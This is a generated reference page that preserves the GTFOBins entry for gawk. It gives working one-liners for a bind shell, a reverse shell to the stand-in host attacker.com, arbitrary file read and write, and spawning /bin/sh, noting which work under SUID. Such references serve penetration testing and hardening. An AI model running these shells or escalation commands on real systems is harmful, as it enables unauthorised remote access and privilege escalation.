---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# gawk

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `gawk` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/gawk` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [gawk](../../tools/linux/gawk.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | gawk |
| name | gawk |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/gawk/ |

## Preserved Source Material

```yaml
_body: ''
_name: gawk
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/gawk
functions:
  bind-shell:
  - code: "gawk 'BEGIN {\n    s = \"/inet/tcp/12345/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0)\
      \ break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
    connector: tcp-client
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
  file-read:
  - code: gawk '//' /path/to/input-file
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  file-write:
  - code: gawk 'BEGIN { print "DATA" > "/path/to/output-file" }'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  reverse-shell:
  - code: "gawk 'BEGIN {\n    s = \"/inet/tcp/0/attacker.com/12345\";\n    while (1) {printf \"> \" |& s; if ((s |& getline\
      \ c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
    listener: tcp-server
  shell:
  - code: gawk 'BEGIN {system("/bin/sh")}'
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
```
